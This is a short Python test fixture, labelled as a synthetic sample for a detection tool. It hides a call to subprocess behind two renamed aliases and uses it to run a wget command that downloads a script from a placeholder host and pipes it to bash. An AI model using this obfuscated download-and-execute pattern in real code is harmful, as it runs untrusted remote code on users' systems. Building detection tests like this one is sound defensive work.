# FIXTURE ONLY - synthetic detection test sample, not real malware
# The process call is reached through two renames; the command is a download piped to bash.
import subprocess as sp

run = sp.check_output
r = run
r("wget -qO- https://dl.example.invalid/i.sh | bash", shell=True)
